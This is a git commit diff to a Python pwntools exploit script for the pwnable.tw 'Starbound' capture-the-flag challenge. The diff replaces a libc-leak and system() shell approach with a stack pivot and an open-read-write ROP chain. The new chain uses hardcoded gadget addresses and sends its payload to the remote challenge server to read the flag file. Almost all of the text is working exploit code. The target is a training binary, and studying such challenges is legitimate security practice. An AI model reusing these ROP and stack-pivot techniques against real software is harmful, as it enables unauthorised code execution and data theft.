51697cda616fd174dd902765f42128efd74dcdf1
0x01f <aboultraman@gmail.com>
2018-08-08 18:20:19 +0800

    huge binary with obvious vulnerabilities; stack pivot -> orw; ret2dl_resolve; DynElf

--- pwnable_Starbound/exp.py
+++ pwnable_Starbound/exp.py
@@ -13,7 +13,7 @@ libcPath = "./libc_32.so.6"
 remoteAddr = "chall.pwnable.tw"
 remotePort = 10202
 
-#  context.log_level = "debug"
+context.log_level = "debug"
 context.binary = elfPath
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
@@ -21,17 +21,17 @@ elf = context.binary
 if sys.argv[1] == "l":
     io = process(elfPath)
     libc = elf.libc
-    offset = 0x3f0000 + 0xa
+    fname = "./flag\0"
 
 else:
     if sys.argv[1] == "d":
         io = process(elfPath, env = {"LD_PRELOAD": libcPath}, timeout = 2)
     else:
         io = remote(remoteAddr, remotePort, timeout = 2)
-        context.log_level = "info"
+        context.log_level = "debug"
     if libcPath:
         libc = ELF(libcPath)
-    offset = 0x1e000a
+    fname = "/home/starbound/flag\0"
 
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
@@ -55,22 +55,24 @@ def setName(name):
     io.sendlineafter("> ", "1")
 
 if __name__ == "__main__":
+    '''
+    0x08048e48: add esp, 0x1c; ret;
+    '''
+    stackPivot = 0x8048e48
+    setName(p32(stackPivot) * 2 + fname)
     #  DEBUG([0x804A65D])
-    setName(p32(elf.plt['puts']) + 'aaaaaaaaaaaa')
-    io.sendlineafter("> ", "-33 ".ljust(0x18, 'b'))
-    libc.address = u32(io.recvuntil('\xf7')[-4: ]) - offset
-    success("libc", libc.address)
-    #  DEBUG([0x8049972])
-    setName(p32(libc.sym['system']) * 8)
-    io.sendlineafter("> ", "     -33;$0;$0;$0;$0;")
-    
-    try:
-        context.log_level = "debug"
-        io.sendline("echo aaaa")
-        io.recvuntil("aaaa", timeout = 1)
-        io.sendline("cat /home/starbound/flag")
-        
-    except EOFError:
-        io.close()
-    else:
-        io.interactive()
+    #  io.sendlineafter("> ", "-33 aaaabbbbccccddddeeeeffffgggg")
+    '''
+    0x080499ef : pop esi ; ret
+    0x080499ee : pop ebx ; pop esi ; ret
+    0x080494da : pop ebx ; pop esi ; pop edi ; ret
+    '''
+    pr = 0x80499ef
+    ppr = 0x80499ee
+    pppr = 0x80494da
+    faddr = 0x80580d8
+    payload = flat(["-33 aaaa", elf.plt['open'], ppr, faddr, 0, elf.plt['read'], pppr, 3, elf.bss() + 0x500, 0x100, elf.plt['write'], 0xdeadbeef, 1, elf.bss() + 0x500, 0x100])
+    assert len(payload) < 0x100
+    io.sendlineafter("> ", payload)
+
+    io.interactive()
